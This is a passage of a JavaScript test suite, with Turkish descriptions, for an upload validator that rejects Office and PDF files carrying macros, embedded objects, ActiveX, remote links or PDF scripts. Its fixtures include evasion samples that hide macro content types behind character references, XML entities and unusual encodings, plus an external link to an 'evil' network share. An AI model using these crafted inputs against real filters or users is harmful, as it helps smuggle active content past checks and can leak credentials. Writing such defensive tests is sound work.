  it('B5: OLE nesnesi embeddings/ DIŞINDA (word/objects/o1.bin) ve oleObject içerik türüyle bildirilmiş: reddedilir', async () => {
    const buffer = doc([{ name: 'word/objects/o1.bin', data: Buffer.alloc(64, 1) }], types(WORD_MAIN, '<Override PartName="/word/objects/o1.bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>'));
    const verdict = await rejection(buffer);
    assert.deepEqual([verdict.code, verdict.reason], ['DOCUMENT_ACTIVE_CONTENT', 'embedded']);
  });

  it('B6: ActiveX activeX/ DIŞINDA (word/ctl/ax1.bin) içerik türüyle ya da control ilişkisiyle bildirilmiş: reddedilir', async () => {
    const byType = doc([{ name: 'word/ctl/ax1.bin', data: Buffer.alloc(64, 1) }], types(WORD_MAIN, '<Override PartName="/word/ctl/ax1.bin" ContentType="application/vnd.ms-office.activeX"/>'));
    assert.equal((await rejection(byType)).reason, 'embedded');
    const byRel = doc([relEntry('word/_rels/document.xml.rels', `<Relationship Id="rId2" Type="${REL('control')}" Target="ctl/ax1.xml"/>`), { name: 'word/ctl/ax1.xml', data: '<ax/>' }]);
    assert.equal((await rejection(byRel)).reason, 'embedded');
  });

  it('B7: [Content_Types].xml UTF-16LE / UTF-16BE / BOM\'lu UTF-8 + macroEnabled ana tür reddedilir', async () => {
    const macro = types('application/vnd.ms-word.document.macroEnabled.main+xml');
    for (const [label, data] of [['utf16le', utf16le(macro)], ['utf16be', utf16be(macro)], ['utf8+BOM', bomUtf8(macro)]]) {
      const buffer = makeZip([{ name: '[Content_Types].xml', data, method: 8 }, { name: 'word/document.xml', data: '<w:document/>' }]);
      assert.equal((await rejection(buffer)).reason, 'macro', label);
    }
  });

  it('B8: vbaProject FARKLI adla (word/p.bin) + vbaProject içerik türü (UTF-16, karakter başvurusu ile gizli) reddedilir', async () => {
    const hidden = types(WORD_MAIN, '<Override PartName="/word/p.bin" ContentType="application/vnd.ms-office.vba&#80;roject"/>');
    const buffer = makeZip([
      { name: '[Content_Types].xml', data: utf16le(hidden), method: 8 },
      { name: 'word/document.xml', data: '<w:document/>' },
      { name: 'word/p.bin', data: Buffer.alloc(64, 1) },
    ]);
    assert.equal((await rejection(buffer)).reason, 'macro');
    assert.equal((await rejection(doc([], types(WORD_MAIN, '<Override PartName="/x" ContentType="application/vnd.ms-&#x6d;acroEnabled"/>')))).reason, 'macro', 'içerik türü karakter başvurusuyla gizlenemez');
  });

  it('kodlama / DOCTYPE hileleri: UTF-32, özel varlık tanımı (DOCTYPE/ENTITY), tanınmayan encoding bildirimi (ibm037) 415 DOCUMENT_CONTENT_MISMATCH', async () => {
    const mismatch = { code: 'DOCUMENT_CONTENT_MISMATCH' };
    const entity = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE Types [<!ENTITY m "macroEnabled">]>' + types().replace('<?xml version="1.0" encoding="UTF-8"?>', '').replace(WORD_MAIN, 'application/vnd.ms-word.document.&m;.main+xml');
    assert.deepEqual(await check(doc([], entity), { expectedKind: 'docx' }), mismatch, 'özel varlıkla gizlenmiş macroEnabled');
    assert.deepEqual(await check(doc([], types().replace('encoding="UTF-8"', 'encoding="ibm037"')), { expectedKind: 'docx' }), mismatch, 'EBCDIC bildirimi');
    const utf32 = Buffer.concat([Buffer.from([0xff, 0xfe, 0x00, 0x00]), Buffer.from(types(), 'utf16le')]);
    assert.deepEqual(await check(doc([], utf32), { expectedKind: 'docx' }), mismatch, 'UTF-32 BOM');
    assert.deepEqual(await check(doc([{ name: 'word/_rels/document.xml.rels', data: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [<!ENTITY t "attachedTemplate">]><Relationships/>', method: 8 }]), { expectedKind: 'docx' }), mismatch, 'rels içinde DOCTYPE');
    assert.deepEqual(await check(doc([{ name: 'word/_rels/document.xml.rels', data: '<Relationship Id="a" Type="x" Target', method: 8 }]), { expectedKind: 'docx' }), mismatch, 'biçimi bozuk etiket');
  });

  it('xl/externalLinks/ ve çalışma kitabı dış bağlantı ilişkileri (xlsx) reddedilir', async () => {
    const withLinks = makeXlsx({ extra: [{ name: 'xl/externalLinks/externalLink1.xml', data: '<externalLink/>' }] });
    assert.equal((await rejection(withLinks, 'xlsx')).reason, 'external');
    const remoteLink = makeXlsx({ extra: [relEntry('xl/externalLinks/_rels/externalLink1.xml.rels', remote(REL('externalLinkPath'), 'file:///\\\\evil\\share\\book.xlsx'))] });
    assert.equal((await rejection(remoteLink, 'xlsx')).reason, 'external');
  });

  it('MEŞRU belgeler kabul: dış hiperbağlantı / dış resim, iç ilişkiler, xlsx sayfa ilişkileri + printerSettings, UTF-16 meşru [Content_Types].xml', async () => {
    const legit = doc(
      [
        relEntry('_rels/.rels', `<Relationship Id="rId1" Type="${REL('officeDocument')}" Target="word/document.xml"/>`),
        relEntry(
          'word/_rels/document.xml.rels',
          `<Relationship Id="rId1" Type="${REL('styles')}" Target="styles.xml"/><Relationship Id="rId2" Type="${REL('hyperlink')}" Target="https://www.example.com/a?x=1&amp;y=2" TargetMode="External"/><Relationship Id="rId3" Type="${REL('image')}" Target="media/image1.png"/>`,
        ),
        relEntry('word/_rels/settings.xml.rels', `<Relationship Id="rId1" Type="${TEMPLATE}" Target="template.dotx"/>`),
        { name: 'word/styles.xml', data: '<w:styles/>' },
      ],
      types(WORD_MAIN, '<Override PartName="/word/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"/>'),
    );
    assert.equal(await accepted(legit), 'docx', 'iç (göreli) attachedTemplate hedefi uzak değildir');
    assert.equal(await accepted(doc([], utf16le(types()))), 'docx', 'UTF-16 [Content_Types].xml meşrudur');
    const sheetRels = makeXlsx({
      extra: [
        relEntry('xl/worksheets/_rels/sheet1.xml.rels', `<Relationship Id="rId1" Type="${REL('printerSettings')}" Target="../printerSettings/printerSettings1.bin"/><Relationship Id="rId2" Type="${REL('hyperlink')}" Target="https://example.com/" TargetMode="External"/>`),
        { name: 'xl/printerSettings/printerSettings1.bin', data: 'yazici' },
      ],
    });
    assert.equal(await accepted(sheetRels, 'xlsx'), 'xlsx');
  });

  it('İLETİ DOĞRU: gömülü nesne "betik, makro" diye anılmaz (reason: embedded); makro, uzak şablon, çalıştırılabilir, PDF betiği kendi iletisini taşır', async () => {
    const embedded = await rejection(doc([{ name: 'word/embeddings/eski.xls', data: Buffer.alloc(32, 1) }]));
    assert.equal(embedded.code, 'DOCUMENT_ACTIVE_CONTENT');
    assert.equal(embedded.reason, 'embedded');
    assert.match(embedded.message, /Gömülü nesne/);
    assert.ok(!/betik|makro/i.test(embedded.message), embedded.message);
    const macro = await rejection(doc([{ name: 'word/vbaProject.bin', data: 'x' }]));
    assert.equal(macro.reason, 'macro');
    assert.match(macro.message, /Makro/);
    const external = await rejection(doc([relEntry('word/_rels/settings.xml.rels', remote(TEMPLATE))]));
    assert.equal(external.reason, 'external');
    assert.match(external.message, /Uzak şablon/);
    assert.equal((await rejection(doc([{ name: 'word/x.exe', data: 'MZ' }]))).reason, 'executable');
    const pdf = await rejection(makePdf({ extra: '/S /JavaScript' }), 'pdf');
    assert.equal(pdf.reason, 'script');
    assert.match(pdf.message, /betik/);
  });

  it('sınırlar: 1000\'den fazla *.rels girdisi ya da toplam açılım 16 MiB üstü 415 DOCUMENT_CONTENT_MISMATCH', async () => {
    const many = Array.from({ length: 1001 }, (_, i) => ({ name: `word/_rels/p${i}.xml.rels`, data: rels(''), method: 8 }));
    assert.deepEqual(await check(doc(many), { expectedKind: 'docx' }), { code: 'DOCUMENT_CONTENT_MISMATCH' });
    const filler = `<Relationship Id="r" Type="${REL('hyperlink')}" Target="a"/>`.padEnd(3 * 1024 * 1024, ' ');
    const heavy = Array.from({ length: 6 }, (_, i) => ({ name: `word/_rels/h${i}.xml.rels`, data: rels(filler), method: 8 }));
    assert.deepEqual(await check(doc(heavy), { expectedKind: 'docx' }), { code: 'DOCUMENT_CONTENT_MISMATCH' }, '6 x 3 MiB = 18 MiB toplam');
  });
});
